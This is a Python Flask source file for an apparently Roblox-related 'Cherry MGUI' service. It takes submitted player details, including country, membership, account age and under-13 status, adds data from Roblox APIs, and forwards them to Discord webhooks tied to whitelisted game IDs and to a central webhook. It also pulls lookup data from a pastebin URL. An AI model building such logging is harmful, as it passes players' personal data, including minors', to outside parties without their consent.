import os
import json
from datetime import datetime, timezone
from flask import Flask, request
import psycopg2
import requests
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)


def send_discord_webhook(url, embed):
    if not url:
        return None

    headers = {"Content-Type": "application/json"}
    try:
        response = requests.post(url, json=embed, headers=headers, timeout=15)
        return response
    except requests.exceptions.RequestException as e:
        print(f"Discord webhook error: {e}")
        return None


def get_user_id(username):
    url = "https://users.roblox.com/v1/usernames/users"
    payload = {"usernames": [username], "excludeBannedUsers": True}
    headers = {"Content-Type": "application/json"}

    try:
        response = requests.post(url, json=payload, headers=headers, timeout=15)
        response.raise_for_status()
        data = response.json()

        if data.get("data") and len(data["data"]) > 0:
            return data["data"][0].get("id", 1)

        return 1
    except requests.exceptions.RequestException as e:
        print(f"Error in get_user_id: {e}")
        return 1


def get_game_info(game_id):
    try:
        universe_url = f"https://apis.roblox.com/universes/v1/places/{game_id}/universe"
        games_url = "https://games.roblox.com/v1/games"

        with requests.Session() as session:
            response = session.get(universe_url, timeout=15)
            response.raise_for_status()
            jsonu = response.json()

            univ_id = jsonu.get("universeId")
            if not univ_id:
                return {
                    "PlaceName": "N/A",
                    "Playing": 0,
                    "Visits": 0,
                    "Favorites": 0
                }

            response = session.get(games_url, params={"universeIds": univ_id}, timeout=15)
            response.raise_for_status()
            jsongameinfo = response.json()

            data = jsongameinfo.get("data", [])
            if not data:
                return {
                    "PlaceName": "N/A",
                    "Playing": 0,
                    "Visits": 0,
                    "Favorites": 0
                }

            last_element = data[-1]

            return {
                "PlaceName": last_element.get("name", "N/A"),
                "Playing": last_element.get("playing", 0),
                "Visits": last_element.get("visits", 0),
                "Favorites": last_element.get("favoritedCount", 0),
            }

    except requests.exceptions.RequestException as e:
        print(f"Error in get_game_info: {e}")
        return {
            "PlaceName": "N/A",
            "Playing": 0,
            "Visits": 0,
            "Favorites": 0
        }


def get_avatar_thumbnail(user_id):
    try:
        url = f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_id}&size=420x420&format=Png&isCircular=true"
        response = requests.get(url, timeout=15)
        response.raise_for_status()
        jsonavatar = response.json()

        data = jsonavatar.get("data", [])
        if data and data[0].get("imageUrl"):
            return data[0]["imageUrl"]

        return ""
    except requests.exceptions.RequestException as e:
        print(f"Error in get_avatar_thumbnail: {e}")
        return ""


def get_country_name(country_code):
    try:
        if not country_code:
            return "Failed to Fetch The Country"

        url = "https://pastebin.com/raw/ShRBhWd7"
        response = requests.get(url, timeout=15)
        response.raise_for_status()
        country_dec = response.json()

        return country_dec.get(country_code, "Failed to Fetch The Country")
    except requests.exceptions.RequestException as e:
        print(f"Error in get_country_name: {e}")
        return "Failed to Fetch The Country"


def get_community_info(community_name):
    """
    Optional Roblox community/group lookup.
    This fetches community info from the Roblox Groups API.
    """
    if not community_name:
        return {
            "id": None,
            "name": "N/A",
            "description": "N/A",
            "memberCount": 0,
            "owner": "N/A"
        }

    try:
        url = "https://groups.roblox.com/v1/groups/search"
        params = {"keyword": community_name, "limit": 10}
        response = requests.get(url, params=params, timeout=15)
        response.raise_for_status()
        data = response.json()

        groups = data.get("data", [])
        matched = None

        for group in groups:
            if group.get("name", "").lower() == community_name.lower():
                matched = group
                break

        if not matched:
            if groups:
                matched = groups[0]
            else:
                return {
                    "id": None,
                    "name": "N/A",
                    "description": "N/A",
                    "memberCount": 0,
                    "owner": "N/A"
                }

        group_id = matched.get("id")
        group_name = matched.get("name", "N/A")
        description = matched.get("description", "N/A")
        member_count = matched.get("memberCount", 0)

        # Optional: fetch full group details by id
        detail_url = f"https://groups.roblox.com/v1/groups/{group_id}"
        detail = requests.get(detail_url, timeout=15)
        if detail.status_code == 200:
            detail_json = detail.json()
            owner = detail_json.get("owner", {}).get("username", "N/A")
        else:
            owner = "N/A"

        return {
            "id": group_id,
            "name": group_name,
            "description": description,
            "memberCount": member_count,
            "owner": owner
        }

    except requests.exceptions.RequestException as e:
        print(f"Error in get_community_info: {e}")
        return {
            "id": None,
            "name": "N/A",
            "description": "N/A",
            "memberCount": 0,
            "owner": "N/A"
        }


def visit():
    if request.method != "POST":
        return "Invalid request"

    content_type = request.headers.get("Content-Type", "")
    if not content_type.lower().startswith("application/x-www-form-urlencoded"):
        return "Unsupported Media Type: Expected 'application/x-www-form-urlencoded'"

    game_id = request.form.get("game_id")
    username = request.form.get("username")
    membership = request.form.get("membership")
    player_age_13 = request.form.get("player_age_13")
    player_age_days = request.form.get("player_age_days")
    verified = request.form.get("verified")
    country_code = request.form.get("country_code")
    community_name = request.form.get("community_name")

    if not all([game_id, username, membership, player_age_13, player_age_days, verified, country_code]):
        return "One or more fields are empty. Please fill in all the required information."

    if player_age_13 == "13_Above":
        player_age_13 = "13+"
    else:
        player_age_13 = "<13"

    user_id = get_user_id(username)
    game_info = get_game_info(game_id)
    thumbnail_url = get_avatar_thumbnail(user_id)
    country_name = get_country_name(country_code)

    community_info = get_community_info(community_name)

    conn = None
    try:
        connection_string = os.getenv("POSTGRES_CONNECTION_STRING")
        conn = psycopg2.connect(connection_string)
        print("Visit Embed Connection to PostgreSQL successful.")
    except psycopg2.Error as e:
        print(f"Error connecting to PostgreSQL: {e}")
        return "Database connection failed"

    try:
        select_query = "SELECT * FROM webhooks WHERE gameid = %s"
        with conn.cursor() as cur:
            cur.execute(select_query, (game_id,))
            rows = cur.fetchall()

            if not rows:
                return "Game Not Whitelisted"

            column_names = [desc[0] for desc in cur.description]
            visit_index = column_names.index("visit")
            disc_id_index = column_names.index("discid")

            visit_webhook = rows[0][visit_index]
            discord_id = rows[0][disc_id_index]

    finally:
        conn.close()

    timestamp = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%fZ")

    community_text = ""
    if community_info.get("name") != "N/A":
        community_text = (
            f"\n**Community:** {community_info['name']}\n"
            f"**Owner:** {community_info['owner']}\n"
            f"**Members:** {community_info['memberCount']}"
        )

    embed = {
        "username": "Cherry MGUI",
        "avatar_url": "https://media.discordapp.net/attachments/1111178830141472839/1122470593971896370/IMG_20220624_144024_140.jpg",
        "embeds": [
            {
                "title": "[Click here to view account]",
                "type": "rich",
                "description": f"**{username} - Has Joined The Game. Check Out Their Profile On The Roblox Website To Learn More About Them!**{community_text}",
                "url": f"https://roblox.com/users/{user_id}/profile",
                "timestamp": timestamp,
                "color": 0x8F0000,
                "footer": {
                    "text": "Powered By: Cherry MGUI 💕",
                    "icon_url": "https://media.discordapp.net/attachments/1111178830141472839/1122470593971896370/IMG_20220624_144024_140.jpg"
                },
                "thumbnail": {
                    "url": thumbnail_url
                },
                "author": {
                    "name": "Cherry - VISIT [RESULT]",
                    "icon_url": "https://media.discordapp.net/attachments/1111178830141472839/1122470593971896370/IMG_20220624_144024_140.jpg"
                },
                "fields": [
                    {
                        "name": "**🎮GAME [INFO]**",
                        "value": (
                            "```yaml\n"
                            f"Game Name: {game_info['PlaceName']}\n"
                            f"Visits: {game_info['Visits']}\n"
                            f"Playing: {game_info['Playing']}\n"
                            f"Favorites: {game_info['Favorites']}\n"
                            "```"
                        ),
                        "inline": True
                    },
                    {
                        "name": "**👥PLAYER [INFO]**",
                        "value": (
                            "```yaml\n"
                            f"Country: [{country_name}]\n"
                            f"Security: [{verified}]\n"
                            f"Membership: [{membership}]\n"
                            f"AccountAge: [{player_age_days} Day's Old, {player_age_13}]\n"
                            "```"
                        ),
                        "inline": False
                    },
                    {
                        "name": "**🔐PLAYER [KEY]**",
                        "value": f"```yaml\nUserName - {username}```",
                        "inline": False
                    },
                    {
                        "name": "**GAME [LINK]**",
                        "value": f"**[View Place](https://www.roblox.com/games/{game_id})**",
                        "inline": False
                    }
                ]
            }
        ]
    }

    response = send_discord_webhook(visit_webhook, embed)

    embed_all_visit = {
        "username": "Cherry MGUI",
        "avatar_url": "https://media.discordapp.net/attachments/1111178830141472839/1122470593971896370/IMG_20220624_144024_140.jpg",
        "embeds": [
            {
                "title": "",
                "type": "rich",
                "description": f"**DiscordUser:** <@{discord_id}>\n```{game_info['PlaceName']}```",
                "timestamp": timestamp,
                "color": 0x8F0000,
                "footer": {
                    "text": "Powered By: Cherry MGUI 💕",
                    "icon_url": "https://media.discordapp.net/attachments/1111178830141472839/1122470593971896370/IMG_20220624_144024_140.jpg"
                },
                "thumbnail": {
                    "url": thumbnail_url
                },
                "author": {
                    "name": "Cherry - ALL [VISITS]",
                    "icon_url": "https://media.discordapp.net/attachments/1111178830141472839/1122470593971896370/IMG_20220624_144024_140.jpg"
                },
                "fields": [
                    {
                        "name": "**🎮GAME [INFO]**",
                        "value": (
                            "```yaml\n"
                            f"Visits: {game_info['Visits']}\n"
                            f"Playing: {game_info['Playing']}\n"
                            f"Favorites: {game_info['Favorites']}\n"
                            "```"
                        ),
                        "inline": False
                    },
                    {
                        "name": "**👥PLAYER [INFO]**",
                        "value": (
                            f"**Country:** __[{country_name}]__\n"
                            f"**Security:** __{verified}__\n"
                            f"**Membership:** __{membership}__\n"
                            f"**Account Age:** __{player_age_days} Day's Old, {player_age_13}__"
                        ),
                        "inline": True
                    }
                ]
            }
        ]
    }

    all_visit_response = send_discord_webhook(os.getenv("ALL_VISIT_WEBHOOK"), embed_all_visit)

    if response and response.status_code == 204 and all_visit_response and all_visit_response.status_code == 204:
        return "Webhook Send Successfully"

    return "Failed to Send Webhook"


if __name__ == "__main__":
    app.run(debug=True)
